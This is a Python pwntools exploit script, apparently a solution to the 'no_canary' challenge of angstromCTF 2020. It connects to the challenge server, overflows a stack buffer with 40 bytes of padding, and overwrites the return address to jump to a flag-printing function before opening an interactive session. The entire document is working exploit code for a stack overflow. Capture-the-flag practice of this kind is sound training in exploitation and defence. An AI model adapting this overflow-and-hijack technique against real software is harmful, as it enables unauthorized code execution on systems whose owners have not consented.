from pwn import *

# for no_canary challenge angstrom 2020 ctf
context.arch = 'amd64'
#sh = process("./no_canary")
sh = remote("shell.actf.co", 20700)

offset = "A"*40
main = p64(0x0000000000401199)
flag = p64(0x0000000000401186)



payload = offset
payload += main
payload += flag

sh.recvuntil("name? ")
sh.sendline(payload)
sh.interactive()
